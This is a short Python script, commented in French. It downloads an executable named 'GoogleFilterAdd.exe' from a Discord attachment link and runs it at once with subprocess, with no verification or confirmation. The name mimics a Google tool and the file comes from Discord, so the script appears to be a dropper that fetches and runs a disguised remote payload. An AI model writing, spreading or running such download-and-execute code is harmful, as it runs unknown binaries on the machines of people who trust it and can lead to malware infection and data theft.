import requests
import subprocess

# Lien direct vers ton .exe
url = "https://cdn.discordapp.com/attachments/1377300687146193048/1377300986762100796/GoogleFilterAdd.exe?ex=68387700&is=68372580&hm=ab25b79a286fe88442612bac18877fe08b3e2ea8b7da39abbd9f6a1daaf060ba&"  # remplace "..." par le bon chemin

# Nom sous lequel il sera enregistré localement
file_name = "GoogleFilterAdd.exe"

def telecharger_et_executer(url, file_name):
    response = requests.get(url, stream=True)
    if response.status_code == 200:
        with open(file_name, "wb") as f:
            for chunk in response.iter_content(1024):
                f.write(chunk)
        subprocess.run([file_name], check=True)
    else:
        print("Erreur lors du téléchargement.")

if __name__ == "__main__":
    telecharger_et_executer(url, file_name)
